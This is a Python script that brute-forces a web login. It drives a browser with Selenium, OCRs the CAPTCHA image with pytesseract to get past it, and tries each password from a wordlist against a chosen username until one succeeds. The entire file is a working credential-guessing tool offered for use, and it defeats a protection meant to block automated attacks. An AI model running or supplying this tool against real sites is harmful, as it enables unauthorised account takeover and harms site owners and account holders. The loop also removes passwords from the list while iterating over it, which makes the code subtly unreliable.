from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from PIL import Image
import pytesseract
import time
import io
import requests
import argparse
import os

# -----------------------------
# Configuration
# -----------------------------

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--url", help="Target URL", required=True)
parser.add_argument("-w", "--wordlist", help="wordlist", required=True)
parser.add_argument("-u", "--username", help="username", required=True)
parser.add_argument("-c", "--captcha", help="captcha page generater, eg: captcha.php", required=True)
parser.add_argument("-s", "--sleep", help="how much to wait before next login, depends on your connection", type=int, default=2)
args = parser.parse_args()

url = args.url
wordlist = args.wordlist
username = args.username   # the username to test
captcha = args.captcha
sleep = args.sleep
found = False
captcha_misread = [1]

with open(wordlist, "r") as f:
    passwords = [line.strip() for line in f]


# -----------------------------
# Start browser
# -----------------------------

driver = webdriver.Firefox()   # or webdriver.Chrome()

while not found and len(captcha_misread) > 0:
	c=1
	captcha_misread.clear()
	print("[] number of passwords: ", len(passwords))
	print("[] passwords: ", passwords) 
	for password in passwords:
		print("[] trial number: ",c)
		# 1. Load login page fresh each time
		driver.get(url)
		time.sleep(sleep)  # let page load

		# 2. Get captcha image element
		captcha_elem = driver.find_element(By.XPATH, f"//img[@src='{captcha}']")
	    #captcha_src = captcha_elem.get_attribute("src")

		# 3. Download captcha image (using requests, since Selenium can't grab raw bytes easily)
	    #captcha_resp = requests.get(captcha_src)
		captcha_element = driver.find_element(By.XPATH, "//img[@alt='CAPTCHA']")

	# Screenshot only that element
		captcha_element.screenshot("captcha.png")

	# Open it with PIL
		img = Image.open("captcha.png")

	    #img = Image.open(io.BytesIO(captcha_resp.content))

		# 4. OCR the captcha
		captcha_text = pytesseract.image_to_string(img).strip()
		print(f"[+] Trying password: {password} | Captcha: {captcha_text}")

		# 5. Fill in the form
		driver.find_element(By.NAME, "username").send_keys(username)
		driver.find_element(By.NAME, "password").send_keys(password)
		driver.find_element(By.NAME, "captcha_input").send_keys(captcha_text)

		# If CSRF token field exists
		try:
			csrf_input = driver.find_element(By.NAME, "csrf_token")
			if csrf_input:
				print(f"[+] Found CSRF token: {csrf_input.get_attribute('value')}")
		except:
			pass

		# 6. Submit the form
		driver.find_element(By.ID, "login-btn").click()

		time.sleep(sleep)

		# 7. Check if login failed or succeeded
		try:
			driver.find_element(By.XPATH, f"//img[@src='{captcha}']")
			
			if "Login failed." in driver.page_source:
				print("[-] Login failed")
				passwords.remove(password)
			else:
				captcha_misread.append(1)
				print("[-] misread captcha")
			c +=1
		except NoSuchElementException:
			print("[+][+][+] Login successful!")
			print("Password: ", password)
			found = True
			break  # stop brute-forcing
os.remove("captcha.png")
